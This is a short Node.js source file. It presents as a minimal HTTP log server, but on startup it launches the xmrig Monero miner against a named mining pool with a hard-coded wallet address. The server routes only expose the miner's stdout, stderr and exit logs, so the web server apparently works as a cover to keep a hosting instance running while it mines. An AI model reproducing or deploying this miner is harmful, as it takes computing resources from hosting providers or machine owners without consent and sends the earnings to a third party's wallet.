const http = require("http")
const { spawn } = require("child_process")
const fs = require('fs');
const fsAsync = require('fs').promises;

const port = process.env.PORT || 3000

async function serveFileData(file, res) {
    res.writeHead(200, { "Content-Type": "text/plain" });
    if (fs.existsSync(`${file}.log`)) {
        const data = await fsAsync.readFile(`${file}.log`)
        res.write(data)
    } else {
        res.write("file not found")
    }
    res.end();
}

const server = http.createServer(async (req, res) => {
    if (req.url === "/stdout" && req.method === "GET") {
        serveFileData("stdout", res)
    } else if (req.url === "/stderr" && req.method === "GET") {
        serveFileData("stderr", res)
    } else if (req.url === "/exit" && req.method === "GET") {
        serveFileData("exit", res)
    } else {
        res.writeHead(404, { "Content-Type": "application/json" });
        res.write(JSON.stringify({ message: "Route not found" }));
        res.end();
    }
});

function writeToFile(content, fileName) {
    fs.writeFile(fileName, content, err => {
        if (err) {
            console.error(err);
        }
    });
}

server.listen(port, () => {
    console.log(`server started on port: ${port}`);
    const POOL_USER = "42q2w7GGQeUbCGsReRzUrgdiQRXfo3Kezadvi8ALfvbSWXYr9dG1bnGUqaLN3X6SjgX5ozzUQMZwaKMt4zfNb7cwMSU82CG"
    const xmrig = spawn("xmrig", ["-a", "rx/0", "-o", "sg.monero.herominers.com:10191", "-u", POOL_USER, "-k", "--tls", "-p", "wsl"])
    let timer = 5
    const logs = []

    function handleLogEvt(type) {
        return (data) => {
            const log = data.toString()
            console.log(log)
            logs.push(log)
            if (timer === 5) {
                timer = 0
                writeToFile(logs.join(""), `${type}.log`)
                logs.length = 0
            }
            timer++
        }
    }

    xmrig.stdout.on('data', handleLogEvt("stdout"));
    xmrig.stderr.on('data', handleLogEvt("stderr"));
    xmrig.on('exit', handleLogEvt("exit"));
});
